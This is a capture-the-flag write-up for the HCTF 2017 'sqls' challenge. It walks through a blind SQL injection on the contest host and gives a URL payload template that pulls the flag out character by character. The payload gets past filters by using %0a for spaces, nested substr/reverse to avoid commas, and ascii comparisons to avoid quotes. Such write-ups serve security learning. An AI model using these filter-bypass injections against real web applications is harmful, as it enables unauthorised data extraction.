Based on following observations:
- `http://sqls.2017.hctf.io/index/index.php?id=1/2` -> `Id error`
- `http://sqls.2017.hctf.io/index/index.php?id=1/1` -> `Alice`
- `http://sqls.2017.hctf.io/index/index.php?id=4/4` -> `We only have 3 users`
- Space, comma, quotes, keywords (or, and, limit, etc.) are filtered. 
- There was two rows with duplicated `id` (`id=1`) in `flag` table.

We can construct the injection as this:
    ```
    http://sqls.2017.hctf.io/index/index.php?id=1/(1/        (select%0a[GUESS]=ascii(substr(reverse(substr(flag%0afrom%0a[OFFSET]))%0afrom%0a[OFFSET_REV]))%0afrom%0aflag%0awhere%0alength(flag)=41))
        ```

Major technique used:
- Replace space with `%0a`
- Use `substr(reverse(substr(flag from 1)) from 40)` to avoid using comma.
- Use `ascii` or hex value to bypass quotes detection

We first used hex comparation for characters guessing, but later found that we need to correct the lower/upper case. Then we use ascii equaling test to get exact value. Actually only the second was needed.
